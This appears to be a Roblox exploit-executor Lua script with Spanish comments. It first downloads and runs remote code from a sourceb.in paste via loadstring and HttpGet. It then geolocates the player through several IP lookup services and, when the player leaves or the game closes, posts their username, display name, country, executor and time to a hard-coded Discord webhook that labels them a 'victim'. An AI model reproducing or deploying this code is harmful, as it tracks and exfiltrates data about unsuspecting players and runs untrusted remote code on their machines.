local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ====================================
-- Script 1: Ejecutar loadstring primero y asegurar que termine
-- ====================================
if not getgenv().EjecutarsePrimero_TP then
    getgenv().EjecutarsePrimero_TP = true

    local success, err = pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
    end)

    if not success then
        warn("Error al ejecutar loadstring: "..tostring(err))
    end
end

-- ====================================
-- Script 2: Webhook al salir - ultra seguro
-- ====================================
if not getgenv().EjecutarsePrimero_Webhook then
    getgenv().EjecutarsePrimero_Webhook = true

    local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"
    local mainImageURL = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg"
    local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
    local executorName = identifyexecutor and identifyexecutor() or "Desconocido"

    -- Función para detectar país con varios servicios usando request
    local function detectCountry()
        local country = "Desconocido"
        local services = {
            "https://ipapi.co/json",
            "https://ipinfo.io/json",
            "https://ipwhois.app/json/",
            "http://ip-api.com/json",
            "https://geolocation-db.com/json/"
        }

        for _, url in ipairs(services) do
            local success, response = pcall(function()
                return request({Url = url, Method = "GET"}).Body
            end)
            if success and response then
                local data = HttpService:JSONDecode(response)
                if data then
                    if data.country_name then country = data.country_name
                    elseif data.country then country = data.country
                    elseif data.countryCode then country = data.countryCode
                    elseif data.country_name_long then country = data.country_name_long
                    end
                end
            end
            if country ~= "Desconocido" then break end
        end
        return country
    end

    local countryName = detectCountry()

    -- Función para enviar webhook, con retry hasta 3 intentos
    local function SendExitWebhook()
        local info = {
            ["username"] = "🚨 Sistema VIP Roblox",
            ["avatar_url"] = mainImageURL,
            ["content"] = "**🚨⚠️ ¡Víctima se salió del servidor! ⚠️🚨**",
            ["embeds"] = {{
                ["title"] = "🎮 Panel de Salida - VIP Dashboard",
                ["description"] = "Información capturada automáticamente con doble imagen:",
                ["color"] = 16729344,
                ["thumbnail"] = {["url"] = avatarUrl}, -- avatar del jugador
                ["image"] = {["url"] = mainImageURL}, -- imagen grande
                ["fields"] = {
                    {["name"]="👤 Usuario", ["value"]=LocalPlayer.Name, ["inline"]=true},
                    {["name"]="✨ DisplayName", ["value"]=LocalPlayer.DisplayName, ["inline"]=true},
                    {["name"]="🌎 País", ["value"]=countryName, ["inline"]=true},
                    {["name"]="🛠️ Executor", ["value"]=executorName, ["inline"]=true},
                    {["name"]="⏰ Hora", ["value"]=os.date("%Y-%m-%d %H:%M:%S"), ["inline"]=false},
                    {["name"]="🔗 Imagen embed", ["value"]="[Click aquí]("..mainImageURL..")", ["inline"]=false}
                },
                ["footer"] = {["text"] = "Sistema de Salida • " .. os.date("%d/%m/%Y")}
            }}
        }

        local FinalData = HttpService:JSONEncode(info)
        request = request or http_request or syn.request

        if request then
            local attempts = 0
            local sent = false
            repeat
                attempts = attempts + 1
                local success, err = pcall(function()
                    request({
                        Url = WebhookURL,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = FinalData
                    })
                end)
                if success then
                    sent = true
                else
                    task.wait(1) -- espera 1 segundo antes de reintentar
                end
            until sent or attempts >= 3
        end
    end

    -- Detectar salida del jugador
    LocalPlayer.AncestryChanged:Connect(function(_, parent)
        if not parent then
            SendExitWebhook()
        end
    end)

    -- Detectar cierre del juego
    game:BindToClose(function()
        SendExitWebhook()
    end)
end
